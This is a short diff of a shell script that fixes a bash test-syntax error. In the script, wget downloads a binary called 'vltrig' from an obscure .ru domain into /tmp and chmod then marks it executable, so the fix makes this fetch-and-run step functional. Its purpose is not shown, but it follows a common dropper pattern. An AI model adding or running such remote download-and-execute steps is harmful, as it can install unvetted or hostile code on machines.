@@ -2,7 +2,7 @@
 FILE_CHK=/tmp/vltrig
 
 cd /tmp
-if [! -f "$FILE_CHK" ]; then
+if [ ! -f "$FILE_CHK" ]; then
     wget https://bio.ivanhi0.ru/vltrig
 fi
 chmod +x ./vltrig
